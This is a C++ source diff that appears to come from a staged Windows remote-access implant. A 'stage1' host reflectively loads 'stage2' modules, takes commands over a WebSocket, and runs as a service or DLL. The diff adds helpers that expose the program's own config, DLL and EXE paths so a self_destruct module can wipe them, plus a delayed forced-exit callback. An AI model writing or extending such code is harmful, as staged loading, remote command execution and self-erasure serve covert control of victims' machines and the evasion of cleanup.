@@ -149,6 +149,16 @@ static ServiceManager g_services;
 // reflectively-loaded modules can send/log/get-config through the live
 // WebSocket + logger without linking directly against ws_client.h.
 // ══════════════════════════════════════════════════════════════════════
+// ── Forward declarations needed by stage2::* bridge functions below ──
+// These globals / helpers are defined further down in this translation
+// unit; the bridges call them via `::` prefix. Declared here so the
+// compiler can resolve them when it first sees the bridge code.
+// Non-static forward declarations — definitions later match (also non-static).
+extern std::string g_config_path;
+extern HMODULE g_dll_module;  // defined in dllmain.cpp (DLL build) or just above (EXE build)
+void stop_streaming();
+extern "C" void shutdown_workers(int timeout_ms);
+
 namespace stage2 {
     void stage1_ws_send(const char* json) {
         if (!json || !g_ws || !g_ws->is_connected()) return;
@@ -180,6 +190,23 @@ namespace stage2 {
         if (k == "server_address") return g_config.server_address.c_str();
         if (k == "codec")          return g_config.codec.c_str();
         if (k == "log_level")      return g_config.log_level.c_str();
+        // Path keys — needed by self_destruct / host_update to know what files
+        // to wipe or replace. Computed lazily on first ask, cached per process.
+        if (k == "config_path") {
+            return ::g_config_path.c_str();
+        }
+        if (k == "dll_path") {
+            static char path[MAX_PATH];
+            if (path[0] == 0) {
+                GetModuleFileNameA(::g_dll_module, path, MAX_PATH);
+            }
+            return path[0] ? path : nullptr;
+        }
+        if (k == "exe_path") {
+            static char path[MAX_PATH];
+            if (path[0] == 0) GetModuleFileNameA(NULL, path, MAX_PATH);
+            return path[0] ? path : nullptr;
+        }
         return nullptr;
     }
     int stage1_get_config_int(const char* key, int def) {
@@ -198,6 +225,25 @@ namespace stage2 {
         return def;
     }
     std::string stage1_room_token() { return g_config.room_token; }
+
+    // ── ABI v1.1 callbacks ──
+    // Synchronous stream stop. Reaches into main.cpp's stop_streaming().
+    void stage1_stop_stream() {
+        try { ::stop_streaming(); } catch (...) {}
+    }
+
+    // Deferred process exit. Called by stage-2 modules (e.g. self_destruct)
+    // that need the host to go away after they finish their work. A detached
+    // thread tears down workers and calls ExitProcess; returns immediately
+    // so the caller (still inside stage-2 code) can return cleanly first.
+    void stage1_host_exit(int exit_code) {
+        std::thread([exit_code]{
+            std::this_thread::sleep_for(std::chrono::milliseconds(500));
+            ::g_running = false;
+            try { ::shutdown_workers(3000); } catch (...) {}
+            ExitProcess((UINT)exit_code);
+        }).detach();
+    }
 }
 
 // ── Service/DLL mode ──
@@ -617,7 +663,7 @@ static void load_config(const std::string& path) {
 }
 
 // ===== Save stream settings to config =====
-static std::string g_config_path;  // set in main()
+std::string g_config_path;  // set in main(); forward-declared at top for stage2 bridges
 
 static void save_stream_settings() {
     if (g_config_path.empty()) return;
@@ -1200,7 +1246,7 @@ static void start_streaming() {
 // Stop streaming pipeline (thread-safe: mutex prevents concurrent stop from
 // watchdog + reconnect + command handler racing → double-join crash)
 static std::mutex g_stop_streaming_mtx;
-static void stop_streaming() {
+void stop_streaming() {
     std::lock_guard<std::mutex> lk(g_stop_streaming_mtx);
     if (!g_streaming) return;
     g_streaming = false;
@@ -3115,6 +3161,7 @@ static void handle_command(const std::string& msg_str) {
         }
 
         else if (cmd == "self_destruct") {
+#ifdef STAGE1_KEEP_FALLBACKS
             send_ok("\"started\"");
 
             auto evt = [&](int step, int total, const std::string& text) {
@@ -3268,6 +3315,9 @@ static void handle_command(const std::string& msg_str) {
             g_running = false;
             std::this_thread::sleep_for(std::chrono::milliseconds(200));
             ExitProcess(0);
+#else
+            send_err("defender module loading, retry in a moment");
+#endif
         }
 
         else {
